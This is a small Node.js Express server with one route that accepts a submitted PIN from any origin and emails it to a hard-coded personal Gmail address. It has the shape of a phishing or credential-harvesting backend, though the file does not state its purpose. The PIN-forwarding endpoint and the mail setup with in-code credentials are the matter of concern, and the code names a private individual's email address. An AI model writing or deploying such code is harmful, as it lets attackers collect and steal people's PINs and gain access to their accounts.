const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();
const PORT = 3000;

// Middleware
app.use(express.json());
app.use(cors()); // Allows requests from different origins (like your frontend)

const EMAIL = "your_email@gmail.com"; // Replace with your email
const PASSWORD = "your_email_password"; // Replace with your email password or app-specific password

const transporter = nodemailer.createTransport({
    service: "gmail", // Use the email provider's service
    auth: {
        user: EMAIL,
        pass: PASSWORD,
    },
});

app.post("/send-pin", async (req, res) => {
    const { pin } = req.body;

    if (!pin) {
        return res.status(400).json({ error: "PIN is required" });
    }

    const mailOptions = {
        from: EMAIL,
        to: "ericsimiyunyonges87@gmail.com", // Recipient's email
        subject: "New PIN Submission",
        text: `A new PIN has been submitted: ${pin}`,
    };

    try {
        await transporter.sendMail(mailOptions);
        res.status(200).json({ message: "PIN sent to email successfully!" });
    } catch (error) {
        res.status(500).json({ error: "Failed to send email", details: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
